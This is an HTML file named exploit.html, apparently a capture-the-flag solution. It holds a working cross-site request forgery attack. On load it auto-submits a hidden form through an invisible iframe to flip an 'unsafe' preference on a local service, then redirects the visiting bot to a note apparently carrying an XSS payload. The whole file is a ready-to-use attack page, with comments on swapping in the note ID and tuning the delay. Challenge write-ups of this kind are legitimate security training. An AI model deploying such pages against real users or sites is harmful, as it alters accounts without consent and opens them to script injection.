<!-- filepath: exploit.html -->
<html>
  <head>
    <title>CSRF Trigger</title>
  </head>
  <body onload="triggerExploit()">
    <p>Please wait...</p>
    <iframe name="csrfFrame" style="display:none;"></iframe>
    <form id="csrfForm" action="http://127.0.0.1:7189/prefs/unsafe" method="POST" target="csrfFrame">
      <!-- Replace YOUR_XSS_NOTE_ID with the actual ID of the note you created in step 2 -->
      <input type="hidden" name="id" value="1" />
      <input type="hidden" name="enable" value="1" />
    </form>
    <script>
      function triggerExploit() {
        document.getElementById('csrfForm').submit();
        // Delay to allow the POST request to complete and update the bot's session
        setTimeout(function() {
          // Redirect the bot to your XSS note.
          // Replace YOUR_XSS_NOTE_ID with the actual ID.
          window.location.href = "http://simplechallenge.ctf.onl:7189/notes/1";
        }, 2000); // Adjust delay if needed (1.5-2 seconds should be okay)
      }
    </script>
  </body>
</html>
